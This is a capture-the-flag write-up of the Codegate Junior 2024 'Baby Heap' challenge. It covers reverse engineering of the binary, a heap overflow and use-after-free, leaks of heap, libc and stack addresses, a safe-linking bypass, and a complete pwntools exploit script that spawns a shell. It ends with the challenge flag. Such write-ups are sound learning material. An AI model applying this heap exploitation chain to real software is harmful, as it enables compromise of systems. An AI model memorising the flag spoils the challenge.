---
date: '2024-06-03T12:02:00Z'
draft: false
title: 'CodegateJunior24 - Baby Heap'
summary: "Heap challenge from the Codegate quals for juniors of 2024. The vulnerability was an heap overflow that enabled an attacker to gain overlapping chunks, therefore arb read and write."

categories: ["Writeups"]
tags: ["pwn", "heap"]
author: "leo_something"
ShowToc: true
---

## BINARY OVERVIEW

Baby Heap is a simple heap based 64 bit binary, when executed it gives the user 5 options:
1. add (create a chunk of a specified size and initialize it with the provided data)
2. free (free a chunk)
3. modify (modify the data of a chunk (max 40 bytes))
4. view (print the data contained in a chunk)
5. exit (return from main)

---
## REVERSE ENGINEERING

After trying every feature of the binary I opened it up in Ida (which usually gives the best decompiled code for x86_64bit binaries) and started to reverse the different functionalities of the program.
##### ADD
From this function I understood 3 really important mechanics of the binary:
- We can allocate max 15 chunks (the number of allocated chunks is saved in a global variable)
- Every chunk we allocate is basically a "struct" (chunk of size 0x20) containing data size, a "is_used" flag and a pointer to a chunk containing the data itself.

	```
	 -------------------------
	|     CHUNCK METADATA     |
	 ------------- -----------
	|  data_size  |  is_used  |
	 ------------- -----------
	| data_chunck |           |
	 -------------------------
	```
	_Structure of the chunk containing the "struct"_
	
- Every time a chunk is created the pointer to its "struct" is saved in a global array
- The size of data can be max 199, so the bigger chunk we can allocate is 208 bytes big

**NOTE**: 
Hereinafter I will use these words:
- `struct` to talk about the "struct" explained above (chunk of size 0x20)
- `chunk_num` is the global variable containing the number of allocated chunks
- `chunk_list` is the global array containing the pointers to the structs 
- `is_used` is the flag that determines if a chunk is free or allocated
- `data_chunk` is the chunk containing the data
- `data_size` is the number of bytes of data

##### FREE
This function might seem well implemented (it sets `is_used` to 0, frees `data_chunk` and removes its pointer from the relative `struct` and finally frees the `struct` itself).
After a closer look I spotted the following issues:
- `chunk_num` is never decremented 
- `struct` pointer is never removed from `chunk_list` (can lead to UAF)

##### MODIFY
This function holds the main vulnerability of the binary:
```c
read(0, data_chunk, 0x28);
```
Basically you can write 40 bytes into the data chunk, but if the chunk is smaller than 0x28 we can overflow into the next chunk and manipulate its metadata.

##### VIEW
This simply prints the data of a chunk given its index in `chunk_list`. Note that it prints `data_size` bytes, so if we want to read more than our data we will need to tamper `data_size` field in `struct`.


---
## EXPLOITATION

#### First steps

First thing to do before even dreaming of exploiting this thing is getting the libc version, it can easily be copied from the docker image.

```shell
$ docker pull ubuntu:22.04@sha256:a6d2b38300ce017add71440577d5b0a90460d0e57fd7aec21dd0d1b0761bbfb2
$ docker images
REPOSITORY                      TAG       IMAGE ID       CREATED         SIZE
ubuntu                          <none>    52882761a72a   5 weeks ago     77.9MB

$ docker cp "$(docker create 52882761a72a):/usr/lib/x86_64-linux-gnu/libc.so.6" "./"
Successfully copied 6.47MB to ./
```

Then I patched the binary with:

```shell
$ pwninit --bin=chall --libc=./libc.so.6
```

I also used `checksec` to find out that all the protections on the binary are enabled. :( 

#### Leaking stuff

Knowing that we can mess with the metadata of a chunk just by modifying the chunk above, I overrode the size field of a chunk making it bigger, overlapping the chunks after it, this way I was able to leak heap and libc.
The path I took was this:
1. allocate three 0x20 chunks to be overflown later
2. allocate six chunks of the maximum size allowed (0xd0), they will be overlapped by a big chunk of size 0x4f0 (which goes into unsortedbins when freed).
3. free one of the 0xd0 chunks (the `fd` of this chunk will be used to leak the heap)
4. overflow a 0x20 chunk to change the size of the chunk after it to make it bigger, overlapping all the chunks after. We also override the `data_size` of `struct` to be able to read after `data_chunk`.
5. now, reading from this chunk would let us leak the `fd` of the freed chunk, from that we can calculate the heap address, bypassing safe linking with ```fd << 12``` .
6. as the big chunk we created is of size 0x4f0 it will go into unsortedbins when freed and its `fd` will point to libc main arena.
7. tampering the `data_size` of the chunk before the big chunk we can read the `fd` of the big chunk, leaking libc.

As my final goal is to ROP on the stack we will also need to leak the stack, to do that we can exploit the UAF primitive to allocate a chunk over `environ` and read from it.

#### UAF to spawn a shell

Now that we leaked all we needed we can hopefully write a ROP chain on the stack and spawn a sheel. 
To do that I abused the UAF to allocate a chunk over the `old_rbp` on the stack, overriding it with a pointer to a well chosen location on the heap so as to have the perfect constraints for a onegadget. Finally I placed the onegadget over the `retaddr` on the stack and used option 5 (EXIT) to make the program return to the onegadget.

**NOTE:**
The choice of using a onegadget is due to the fact that we can only exploit the UAF on 0x20 chunks, so we have restricted space to write our ROP chain.

#### Problems I faced

Obviously the exploit didn't work first try, the main problems I faced are the following:
- initially I couldn't free the big chunk because I allocated it over the top chunk and this caused a corruption to the top chunk's metadata, making the binary crash.
- I spent a hell of a lot of time understanding why the `free` function was inserting into tcachebins two chunks at a time, that is obviously caused by the fact that an "allocated chunk" is composed of two chunks: `struct` and `data_chunk`.
- heap chunks must be aligned by 16 bytes (last 4 bits of the address must be set to 0), so we cannot allocate directly over the `retaddr` because it is not aligned.
- [safe linking](https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation) is enabled in the libc version used by the binary, so we need to calculate the correct pointer to put in `fd`, I used the following function:
```python
def calculate_P1(P, L):
	L12 = L >> 12
	P = P.to_bytes(8, "big")
	L12 = L12.to_bytes(8, "big")
	return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16)
```

#### Final Exploit
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ["alacritty", "-e"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("13.125.233.58", 7331)

    return r

r = conn()

def get_heap_base(Pprime):
    Pprime_byte = 0 
    xor_byte = 0
    decoded = Pprime >> 36

    for i in range(3):
        Pprime_byte = Pprime >> (28 - i*8)
        xor_byte = Pprime_byte ^ (decoded >> 4)
        decoded = decoded << 8
        decoded |= xor_byte
    
    return decoded << 12

def calculate_P1(P, L):
    L12 = L >> 12
    P = P.to_bytes(8, "big")
    L12 = L12.to_bytes(8, "big")
    return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16)

def add(size, data):
    r.sendlineafter(b">>", b"1")
    r.sendlineafter(b":", str(size).encode())
    r.sendafter(b":", data)

def free(idx):
    r.sendlineafter(b">>", b"2")
    r.sendlineafter(b":", str(idx).encode())

def modify(idx, data):
    assert len(data) <= 40
    r.sendlineafter(b">>", b"3")
    r.sendlineafter(b":", str(idx).encode())
    r.sendafter(b":", data)

def view(idx):
    r.sendlineafter(b">>", b"4")
    r.sendlineafter(b":", str(idx).encode())
    return r.recvuntil(b"1. add")[1:-6]

def main():

    add(16, b"a"*16)
    add(16, b"b"*16)
    add(16, b"c"*16)
    for _ in range(6):
        add(199, b"x"*199)

    free(3) # chunk for heap leak

    # leak libc and heap abusing chunk overlapping and unsortedbins
    payload = b"c"*16 + b"\x00"*8 + p64(0x4f1) + p64(40)
    modify(1, payload)
    heap = u64(view(2)[-8:]) << 12
    log.warning(f"heap: {hex(heap)}")

    free(2) # free big chunk into unsortedbins

    payload = b"b"*16 + b"\x00"*8 + p64(0x21) + p64(40)
    modify(0, payload)
    libc.address = u64(view(1)[-8:]) - (libc.sym["main_arena"] + 96)
    log.warning(f"libc: {hex(libc.address)}")
    
    payload = b"c"*16 + b"\x00"*8 + p64(0x21) + p64(16)
    modify(0, payload)

    # leak stack (environ)
    payload = b"b"*16 + b"\x00"*8 + p64(0x81) + p64(32)
    modify(4, payload)

    free(4)

    payload = p64(0x10) + p64(1) + p64(libc.sym["environ"])
    add(120, payload)
    retaddr = u64(view(2)[:8]) - 0x120
    log.warning(f"stack: {hex(retaddr)}")

    free(9)

	# ROP on the stack
    payload = (
        b"y"*16 + 
        p64(0) + 
        p64(0x61) + 
        p64(calculate_P1(retaddr-8, heap+0x378)) + 
        p64(heap+0x388) + # goes in rbp (tweak for onegadet)
        p64(heap+0x390) +
        p64(0)*2
    )
    add(120, payload)

    ONE_GADGET = libc.address + 0xebd3f
    rbp = p64(heap+0x380)
    retaddr = p64(ONE_GADGET)
    add(16, rbp + retaddr)

    r.sendlineafter(b">>", b"5") # exit to trigger onegadget

    r.interactive()


if __name__ == "__main__":
    main()
```

**FLAG**: codegate2024{f0de50c65021e07779d3cde7576c4fbe519e6412ad7de1ee743abd08b5b435844184c2295ff705f54b55790a454c427b8faf1d65bbf1f4e19df0c5613d36b0}